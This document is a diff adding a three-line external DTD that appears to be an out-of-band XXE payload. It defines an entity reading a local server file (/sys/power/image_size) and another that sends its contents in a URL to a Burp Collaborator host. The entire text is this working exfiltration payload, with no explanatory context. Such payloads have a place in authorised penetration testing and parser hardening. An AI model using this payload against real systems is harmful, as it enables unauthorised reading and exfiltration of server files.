@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///sys/power/image_size">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://8r0twhplo1ege0ebb040uz0jrax5lu.burpcollaborator.net/?%file;'>">
+%all;
